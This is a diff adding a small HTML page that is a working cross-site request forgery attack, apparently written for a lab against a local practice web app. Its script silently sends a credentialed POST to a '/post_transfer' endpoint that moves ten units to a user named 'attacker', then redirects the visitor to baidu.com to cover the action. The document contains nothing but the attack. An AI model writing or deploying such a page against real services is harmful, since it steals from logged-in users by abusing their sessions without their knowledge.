@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Page</title>
+</head>
+<body>
+    <script>
+        var x = new XMLHttpRequest();
+        x.open("POST", "http://127.0.0.1:3000/post_transfer");
+        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        x.withCredentials = true;
+        x.send("destination_username=attacker&quantity=10");
+        setTimeout("window.location = 'https://www.baidu.com';", 100);
+    </script>
+</body>
+
+</html>
